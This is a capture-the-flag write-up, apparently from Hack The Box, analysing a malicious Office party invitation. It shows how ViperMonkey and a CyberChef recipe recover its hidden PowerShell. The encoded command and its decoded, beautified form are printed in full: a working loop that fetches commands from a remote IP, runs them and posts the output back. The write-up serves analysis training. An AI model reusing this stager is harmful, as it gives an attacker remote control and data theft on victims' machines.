## CHALLENGE INFO
> An email notification pops up.
> It's from your theater group.
> Someone decided to throw a party.
> The invitation looks awesome, but there is something suspicious about this document.
> Maybe you should take a look before you rent your banana costume.

---
## Tools
- https://github.com/decalage2/ViperMonkey

Using ViperMonkey it can emulate the VBA code and extract the powershell payload from the malicious document.
```PowerShell
powershell -WindowStyle hidden -e "JABzAD0AJwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAZAA0ADMAYgBjAGMANgBkAC0AMAA0ADMAZgAyADQAMAA5AC0ANwBlAGEAMgAzAGEAMgBjACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGQANAAzAGIAYwBjADYAZAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMAA0ADMAZgAyADQAMAA5ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADcAZQBhADIAMwBhADIAYwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0ASABUAEIAewA1AHUAcAAzAHIAXwAzADQANQB5AF8AbQA0AGMAcgAwADUAfQA="
```
The extracted powershell payload can then be decoded using the following CyberChef recipe.
`[{"op":"Regular expression","args":["User defined","[a-zA-Z0-9+/=]{40,}",true,true,false,false,false,false,"List matches"]},{"op":"From Base64","args":["A-Za-z0-9+/=",true,false]},{"op":"Decode text","args":["UTF-16LE (1200)"]}]`
```PowerShell
$s='77.74.198.52:8080';$i='d43bcc6d-043f2409-7ea23a2c';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/d43bcc6d -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/043f2409 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/7ea23a2c -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}HTB{5up3r_345y_m4cr05}
```
The flag is already visible here. `HTB{5up3r_345y_m4cr05}`
We can also format the powershell to make it more readable with a beautifier.
```PowerShell
$s = '77.74.198.52:8080';
$i = 'd43bcc6d-043f2409-7ea23a2c';
$p = 'http://';
$v = Invoke-RestMethod  -UseBasicParsing  -Uri $p$s/d43bcc6d -Headers @{"Authorization" = $i};
	while ($true){
		$c = (Invoke-RestMethod -UseBasicParsing -Uri $p$s/043f2409  -Headers @{"Authorization" = $i});
		if ($c -ne 'None'){
		    $r = iex $c  -ErrorAction Stop  -ErrorVariable e;
		    $r = Out-String  -InputObject $r;
		    $t = Invoke-RestMethod -Uri $p$s/7ea23a2c -Method POST -Headers @{"Authorization" = $i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e + $r) -join ' ')
		}
	sleep 0.8
	}
HTB{
5up3r_345y_m4cr05
}
```